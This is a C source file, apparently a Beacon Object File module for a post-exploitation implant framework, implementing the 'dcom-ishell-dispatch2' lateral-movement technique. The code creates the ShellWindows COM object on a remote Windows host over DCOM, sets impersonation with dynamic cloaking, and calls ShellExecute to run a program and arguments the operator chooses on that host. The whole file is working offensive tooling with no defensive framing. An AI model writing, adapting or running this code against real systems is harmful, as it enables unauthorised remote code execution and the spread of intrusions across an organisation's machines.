#define COBJMACROS

#include <oleauto.h>
#include <windows.h>

#include "beacon.h"
#include "com.h"
#include "rex.h"
#include "technique.h"

REX_DEFINE_TECHNIQUE(rex_dcom_shell, "dcom-ishell-dispatch2",
                     "ishelldispatch2_interface",
                     "ishelldispatch2_shellexecute",
                     REX_DISPOSITION_DISPATCHED);

DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
DECLSPEC_IMPORT void WINAPI OLE32$CoUninitialize(void);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstanceEx(REFCLSID, IUnknown *,
                                                        DWORD, COSERVERINFO *,
                                                        DWORD, MULTI_QI *);
DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoSetProxyBlanket(IUnknown *, DWORD, DWORD,
                                                       OLECHAR *, DWORD, DWORD,
                                                       RPC_AUTH_IDENTITY_HANDLE,
                                                       DWORD);
DECLSPEC_IMPORT BSTR WINAPI OLEAUT32$SysAllocString(const OLECHAR *);
DECLSPEC_IMPORT void WINAPI OLEAUT32$SysFreeString(BSTR);
DECLSPEC_IMPORT HRESULT WINAPI OLEAUT32$VariantClear(VARIANTARG *);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);

static const CLSID rex_clsid_shell_windows = {
    0x9ba05972,
    0xf6a8,
    0x11cf,
    {0xa4, 0x42, 0x00, 0xa0, 0xc9, 0x0a, 0x8f, 0x39}};
static const IID rex_iid_dispatch = {
    0x00020400,
    0x0000,
    0x0000,
    {0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46}};
static const IID rex_iid_null = {0};

typedef struct {
    IDispatch *windows;
    IDispatch *application;
    BOOL uninitialize_com;
} rex_shell_state;

static HRESULT rex_proxy(IDispatch *dispatch) {
    return OLE32$CoSetProxyBlanket(
        (IUnknown *)dispatch, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT,
        COLE_DEFAULT_PRINCIPAL, RPC_C_AUTHN_LEVEL_DEFAULT,
        RPC_C_IMP_LEVEL_IMPERSONATE, COLE_DEFAULT_AUTHINFO,
        EOAC_DYNAMIC_CLOAKING);
}

static HRESULT rex_dispatch_id(IDispatch *dispatch, const wchar_t *name,
                               DISPID *id) {
    LPOLESTR names[1];
    names[0] = (LPOLESTR)name;
    return IDispatch_GetIDsOfNames(dispatch, &rex_iid_null, names, 1, 0x0409,
                                   id);
}

static HRESULT rex_dispatch_call(IDispatch *dispatch, const wchar_t *name,
                                 WORD flags, VARIANT *arguments, UINT count,
                                 VARIANT *output) {
    DISPID id;
    DISPPARAMS parameters;
    HRESULT result = rex_dispatch_id(dispatch, name, &id);
    if (FAILED(result))
        return result;
    rex_zero(&parameters, sizeof(parameters));
    parameters.rgvarg = arguments;
    parameters.cArgs = count;
    return IDispatch_Invoke(dispatch, id, &rex_iid_null, 0x0409, flags,
                            &parameters, output, NULL, NULL);
}

static HRESULT rex_dispatch_result(IDispatch *source, const wchar_t *name,
                                   WORD flags, IDispatch **output) {
    VARIANT result;
    HRESULT status;
    *output = NULL;
    rex_zero(&result, sizeof(result));
    status = rex_dispatch_call(source, name, flags, NULL, 0, &result);
    if (SUCCEEDED(status)) {
        if (V_VT(&result) == VT_DISPATCH && V_DISPATCH(&result) != NULL) {
            *output = V_DISPATCH(&result);
            IDispatch_AddRef(*output);
        } else {
            status = E_NOINTERFACE;
        }
    }
    OLEAUT32$VariantClear(&result);
    if (SUCCEEDED(status))
        status = rex_proxy(*output);
    return status;
}

static HRESULT rex_shell_resolve(const rex_request *request,
                                 rex_shell_state **out) {
    HANDLE heap = KERNEL32$GetProcessHeap();
    rex_shell_state *state = (rex_shell_state *)KERNEL32$HeapAlloc(
        heap, HEAP_ZERO_MEMORY, sizeof(*state));
    wchar_t target[REX_MAX_TARGET + 1];
    COSERVERINFO server;
    MULTI_QI query;
    IDispatch *browser = NULL, *document = NULL;
    HRESULT result;
    *out = NULL;
    if (state == NULL)
        return E_OUTOFMEMORY;
    result = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (result == S_OK || result == S_FALSE)
        state->uninitialize_com = TRUE;
    else if (result != RPC_E_CHANGED_MODE)
        goto cleanup;
    result = rex_com_enable_dynamic_cloaking();
    if (FAILED(result))
        goto cleanup;
    if (!toWideChar((char *)request->target, target, sizeof(target))) {
        result = E_INVALIDARG;
        goto cleanup;
    }
    rex_zero(&server, sizeof(server));
    server.pwszName = target;
    rex_zero(&query, sizeof(query));
    query.pIID = &rex_iid_dispatch;
    result = OLE32$CoCreateInstanceEx(&rex_clsid_shell_windows, NULL,
                                      CLSCTX_REMOTE_SERVER, &server, 1, &query);
    if (SUCCEEDED(result))
        result = query.hr;
    if (FAILED(result) || query.pItf == NULL)
        goto cleanup;
    state->windows = (IDispatch *)query.pItf;
    result = rex_proxy(state->windows);
    if (FAILED(result))
        goto cleanup;
    result =
        rex_dispatch_result(state->windows, L"Item", DISPATCH_METHOD, &browser);
    if (FAILED(result))
        goto cleanup;
    result = rex_dispatch_result(browser, L"Document", DISPATCH_PROPERTYGET,
                                 &document);
    if (FAILED(result))
        goto cleanup;
    result = rex_dispatch_result(document, L"Application", DISPATCH_PROPERTYGET,
                                 &state->application);

cleanup:
    if (document != NULL)
        IDispatch_Release(document);
    if (browser != NULL)
        IDispatch_Release(browser);
    if (FAILED(result)) {
        if (state->application != NULL)
            IDispatch_Release(state->application);
        if (state->windows != NULL)
            IDispatch_Release(state->windows);
        if (state->uninitialize_com)
            OLE32$CoUninitialize();
        KERNEL32$HeapFree(heap, 0, state);
        return result;
    }
    *out = state;
    return S_OK;
}

static HRESULT rex_dcom_shell_decode(const rex_arguments *arguments,
                                     rex_request *request) {
    if (arguments->values[0][0] == L'\0' || arguments->values[2][0] != L'\0') {
        return E_INVALIDARG;
    }
    request->config.shell.executable = arguments->values[0];
    request->config.shell.arguments = arguments->values[1];
    return S_OK;
}

static HRESULT rex_dcom_shell_preflight(const rex_request *request,
                                        rex_state *state) {
    rex_shell_state *shell = NULL;
    HRESULT result = rex_shell_resolve(request, &shell);
    if (SUCCEEDED(result))
        state->private_data = shell;
    return result;
}

static HRESULT rex_dcom_shell_execute(const rex_request *request,
                                      rex_state *generic,
                                      rex_observation *observation) {
    rex_shell_state *state = (rex_shell_state *)generic->private_data;
    VARIANT values[5];
    const wchar_t *strings[4];
    UINT index;
    HRESULT result = S_OK;
    (void)observation;
    strings[0] = L"open";
    strings[1] = L"";
    strings[2] = request->config.shell.arguments;
    strings[3] = request->config.shell.executable;
    for (index = 0; index < 5; index++)
        rex_zero(&values[index], sizeof(values[index]));
    V_VT(&values[0]) = VT_I4;
    V_I4(&values[0]) = 0;
    for (index = 0; index < 4; index++) {
        V_VT(&values[index + 1]) = VT_BSTR;
        V_BSTR(&values[index + 1]) = OLEAUT32$SysAllocString(strings[index]);
        if (V_BSTR(&values[index + 1]) == NULL) {
            result = E_OUTOFMEMORY;
            goto cleanup;
        }
    }
    result = rex_dispatch_call(state->application, L"ShellExecute",
                               DISPATCH_METHOD, values, 5, NULL);
cleanup:
    for (index = 0; index < 5; index++)
        OLEAUT32$VariantClear(&values[index]);
    return result;
}

static void rex_dcom_shell_release(rex_state *generic) {
    rex_shell_state *state = (rex_shell_state *)generic->private_data;
    HANDLE heap;
    if (state == NULL)
        return;
    if (state->application != NULL)
        IDispatch_Release(state->application);
    if (state->windows != NULL)
        IDispatch_Release(state->windows);
    if (state->uninitialize_com)
        OLE32$CoUninitialize();
    heap = KERNEL32$GetProcessHeap();
    KERNEL32$HeapFree(heap, 0, state);
    generic->private_data = NULL;
}
